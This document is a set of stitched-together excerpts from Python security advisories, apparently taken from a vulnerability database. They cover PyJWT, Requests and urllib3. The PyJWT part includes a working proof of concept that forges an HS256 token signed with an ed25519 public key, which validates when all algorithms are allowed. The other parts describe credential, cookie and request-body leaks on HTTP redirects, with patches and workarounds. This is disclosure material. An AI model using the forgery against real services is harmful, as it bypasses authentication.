Who is impacted?_\n\nDisclosed by Aapo Oksman (Senior Security Specialist, Nixu Corporation).\n\n\u003e PyJWT supports multiple different JWT signing algorithms. With JWT, an \n\u003e attacker submitting the JWT token can choose the used signing algorithm.\n\u003e \n\u003e The PyJWT library requires that the application chooses what algorithms \n\u003e are supported. The application can specify \n\u003e \"jwt.algorithms.get_default_algorithms()\" to get support for all \n\u003e algorithms. They can also specify a single one of them (which is the \n\u003e usual use case if calling jwt.decode directly. However, if calling \n\u003e jwt.decode in a helper function, all algorithms might be enabled.)\n\u003e \n\u003e For example, if the user chooses \"none\" algorithm and the JWT checker \n\u003e supports that, there will be no signature checking. This is a common \n\u003e security issue with some JWT implementations.\n\u003e \n\u003e PyJWT combats this by requiring that the if the \"none\" algorithm is \n\u003e used, the key has to be empty. As the key is given by the application \n\u003e running the checker, attacker cannot force \"none\" cipher to be used.\n\u003e \n\u003e Similarly with HMAC (symmetric) algorithm, PyJWT checks that the key is \n\u003e not a public key meant for asymmetric algorithm i.e. HMAC cannot be used \n\u003e if the key begins with \"ssh-rsa\". If HMAC is used with a public key, the \n\u003e attacker can just use the publicly known public key to sign the token \n\u003e and the checker would use the same key to verify.\n\u003e \n\u003e  From PyJWT 2.0.0 onwards, PyJWT supports ed25519 asymmetric algorithm. \n\u003e With ed25519, PyJWT supports public keys that start with \"ssh-\", for \n\u003e example \"ssh-ed25519\".\n\n```python\nimport jwt\nfrom cryptography.hazmat.primitives import serialization\nfrom cryptography.hazmat.primitives.asymmetric import ed25519\n\n# Generate ed25519 private key\nprivate_key = ed25519.Ed25519PrivateKey.generate()\n\n# Get private key bytes as they would be stored in a file\npriv_key_bytes = \nprivate_key.private_bytes(encoding=serialization.Encoding.PEM,format=serialization.PrivateFormat.PKCS8, \nencryption_algorithm=serialization.NoEncryption())\n\n# Get public key bytes as they would be stored in a file\npub_key_bytes = \nprivate_key.public_key().public_bytes(encoding=serialization.Encoding.OpenSSH,format=serialization.PublicFormat.OpenSSH)\n\n# Making a good jwt token that should work by signing it with the \nprivate key\nencoded_good = jwt.encode({\"test\": 1234}, priv_key_bytes, algorithm=\"EdDSA\")\n\n# Using HMAC with the public key to trick the receiver to think that the \npublic key is a HMAC secret\nencoded_bad = jwt.encode({\"test\": 1234}, pub_key_bytes, algorithm=\"HS256\")\n\n# Both of the jwt tokens are validated as valid\ndecoded_good = jwt.decode(encoded_good, pub_key_bytes, \nalgorithms=jwt.algorithms.get_default_algorithms())\ndecoded_bad = jwt.decode(encoded_bad, pub_key_bytes, \nalgorithms=jwt.algorithms.get_default_algorithms())\n\nif decoded_good == decoded_bad:\n     print(\"POC Successfull\")\n\n# Of course the receiver should specify ed25519 algorithm to be used if \nthey specify ed25519 public key.

This is a product of how `rebuild_proxies` is used to recompute and [reattach the `Proxy-Authorization` header](https://github.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/sessions.py#L319-L328) to requests when redirected. Note this behavior has _only_ been observed to affect proxied requests when credentials are supplied in the URL user information component (e.g. `https://username:password@proxy:8080`).\n\n**Current vulnerable behavior(s):**\n\n1. HTTP → HTTPS: **leak**\n2. HTTPS → HTTP: **no leak**\n3. HTTPS → HTTPS: **leak**\n4. HTTP → HTTP: **no leak**\n\nFor HTTP connections sent through the proxy, the proxy will identify the header in the request itself and remove it prior to forwarding to the destination server. However when sent over HTTPS, the `Proxy-Authorization` header must be sent in the CONNECT request as the proxy has no visibility into further tunneled requests. This results in Requests forwarding the header to the destination server unintentionally, allowing a malicious actor to potentially exfiltrate those credentials.\n\nThe reason this currently works for HTTPS connections in Requests is the `Proxy-Authorization` header is also handled by urllib3 with our usage of the ProxyManager in adapters.py with [`proxy_manager_for`](https://github.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/adapters.py#L199-L235). This will compute the required proxy headers in `proxy_headers` and pass them to the Proxy Manager, avoiding attaching them directly to the Request object. This will be our preferred option going forward for default usage.\n\n### Patches\nStarting in Requests v2.31.0, Requests will no longer attach this header to redirects with an HTTPS destination. This should have no negative impacts on the default behavior of the library as the proxy credentials are already properly being handled by urllib3's ProxyManager.\n\nFor users with custom adapters, this _may_ be potentially breaking if you were already working around this behavior. The previous functionality of `rebuild_proxies` doesn't make sense in any case, so we would encourage any users impacted to migrate any handling of Proxy-Authorization directly into their custom adapter.\n\n### Workarounds\nFor users who are not able to update Requests immediately, there is one potential workaround.\n\nYou may disable redirects by setting `allow_redirects` to `False` on all calls through Requests top-level APIs. Note that if you're currently relying on redirect behaviors, you will need to capture the 3xx response codes and ensure a new request is made to the redirect destination.\n```\nimport requests\nr = requests.get('http://github.com/', allow_redirects=False)\n```\n\n### Credits\n\nThis vulnerability was discovered and disclosed by the following individuals.\n\nDennis Brinkrolf, Haxolot (https://haxolot.com/)\nTobias Funke, (tobiasfunke93@gmail.com)",

Although the behavior of removing the request body is not specified in the section for redirects, it can be inferred by piecing together information from different sections and we have observed the behavior in other major HTTP client implementations like curl and web browsers.\n\nFrom [RFC 9110 Section 9.3.1](https://www.rfc-editor.org/rfc/rfc9110.html#name-get):\n\n\u003e A client SHOULD NOT generate content in a GET request unless it is made directly to an origin server that has previously indicated, in or out of band, that such a request has a purpose and will be adequately supported.\n\n## Affected usages\n\nBecause the vulnerability requires a previously trusted service to become compromised in order to have an impact on confidentiality we believe the exploitability of this vulnerability is low. Additionally, many users aren't putting sensitive data in HTTP request bodies, if this is the case then this vulnerability isn't exploitable.\n\nBoth of the following conditions must be true to be affected by this vulnerability:\n\n* If you're using urllib3 and submitting sensitive information in the HTTP request body (such as form data or JSON)\n* The origin service is compromised and starts redirecting using 303 to a malicious peer or the redirected-to service becomes compromised.\n\n## Remediation\n\nYou can remediate this vulnerability with any of the following steps:\n\n* Upgrade to a patched version of urllib3 (v1.26.18 or v2.0.7)\n* Disable redirects for services that you aren't expecting to respond with redirects with `redirects=False`.\n* Disable automatic redirects with `redirects=False` and handle 303 redirects manually by stripping the HTTP request body.\n",

However, it is possible for a user to specify a `Cookie` header and unknowingly leak information via HTTP redirects to a different origin if that user doesn't disable redirects explicitly.\n\nUsers **must** handle redirects themselves instead of relying on urllib3's automatic redirects to achieve safe processing of the `Cookie` header, thus we decided to strip the header by default in order to further protect users who aren't using the correct approach.\n\n## Affected usages\n\nWe believe the number of usages affected by this advisory is low. It requires all of the following to be true to be exploited:\n\n* Using an affected version of urllib3 (patched in v1.26.17 and v2.0.6)\n* Using the `Cookie` header on requests, which is mostly typical for impersonating a browser.\n* Not disabling HTTP redirects\n* Either not using HTTPS or for the origin server to redirect to a malicious origin.\n\n## Remediation\n\n* Upgrading to at least urllib3 v1.26.17 or v2.0.6\n* Disabling HTTP redirects using `redirects=False` when sending requests.\n* Not using the `Cookie` header.",

              "details": "urllib3 is a user-friendly HTTP client library for Python. urllib3 previously wouldn't remove the HTTP request body when an HTTP redirect response using status 301, 302, or 303 after the request had its method changed from one that could accept a request body (like `POST`) to `GET` as is required by HTTP RFCs. Although this behavior is not specified in the section for redirects, it can be inferred by piecing together information from different sections and we have observed the behavior in other major HTTP client implementations like curl and web browsers. Because the vulnerability requires a previously trusted service to become compromised in order to have an impact on confidentiality we believe the exploitability of this vulnerability is low. Additionally, many users aren't putting sensitive data in HTTP request bodies, if this is the case then this vulnerability isn't exploitable. Both of the following conditions must be true to be affected by this vulnerability: 1. Using urllib3 and submitting sensitive information in the HTTP request body (such as form data or JSON) and 2. The origin service is compromised and starts redirecting using 301, 302, or 303 to a malicious peer or the redirected-to service becomes compromised. This issue has been addressed in versions 1.26.18 and 2.0.7 and users are advised to update to resolve this issue. Users unable to update should disable redirects for services that aren't expecting to respond with redirects with `redirects=False` and disable automatic redirects with `redirects=False` and handle 301, 302, and 303 redirects manually by stripping the HTTP request body.\n",
